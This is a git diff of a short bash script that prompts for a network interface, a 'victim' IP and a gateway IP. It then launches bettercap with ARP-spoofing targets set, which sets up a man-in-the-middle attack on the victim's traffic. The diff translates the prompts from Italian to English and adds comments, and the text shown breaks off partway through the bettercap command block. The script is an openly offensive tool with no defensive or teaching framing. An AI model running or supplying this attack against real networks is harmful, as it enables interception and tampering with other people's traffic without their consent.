@@ -1,13 +1,17 @@
 #!/bin/bash
+#Remember use sudo bettercap -iface "$iface", probe.on, net.show to find ip
 
-read -p "Inserisci il nome dell'interfaccia di rete: " iface
-read -p " Inserisci l'IP della vittima: " victim
-read -p " Inserisci l'IP del gateway/router: " router
+# Insert iface, ip gateway and ip target
+read -p "Insert network interface name: " iface
+read -p "Insert IP target: " victim
+read -p "Insert IP router/gateway: " router
 
-echo "    Interfaccia: $iface"
-echo "    Vittima:     $victim"
+#Show it
+echo "    Interface: $iface"
+echo "    Victim:     $victim"
 echo "    Gateway:     $router"
 
+#Launch bettercap against target 
 sudo bettercap -iface "$iface" <<EOF
 set arp.spoof.targets $victim
 set arp.spoof.gateway $router
